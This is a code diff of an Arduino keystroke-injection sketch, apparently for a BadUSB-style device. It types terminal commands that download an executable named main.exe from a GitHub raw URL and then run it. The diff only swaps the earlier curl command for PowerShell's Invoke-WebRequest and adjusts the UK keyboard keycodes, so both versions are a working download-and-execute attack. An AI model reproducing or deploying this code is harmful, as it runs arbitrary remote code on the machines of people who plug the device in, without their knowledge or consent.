@@ -14,19 +14,21 @@ void setup() {
   Keyboard.releaseAll();
   delay(800);
 
-  Keyboard.print("cmd");
+  Keyboard.print("Terminal");
   delay(500);
   Keyboard.write(KEY_RETURN);
-  delay(1000);
+  delay(1050);
 
   String rawUrl = "https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/main.exe";
   // @ become '"' on a UK layout
-  Keyboard.print("curl -L -C - -O @");
+  Keyboard.print("Invoke-WebRequest @");
   Keyboard.print(rawUrl);
-  Keyboard.print("@ && ");
+  Keyboard.print("@ -OutFile main.exe; ");
 
   // Uk keycode for '\'
-  Keyboard.write(0xED);
+  Keyboard.write('.');
+  Keyboard.pressRaw(0x64);
+  Keyboard.releaseRaw(0x64);
 
   Keyboard.println("main.exe");
 }
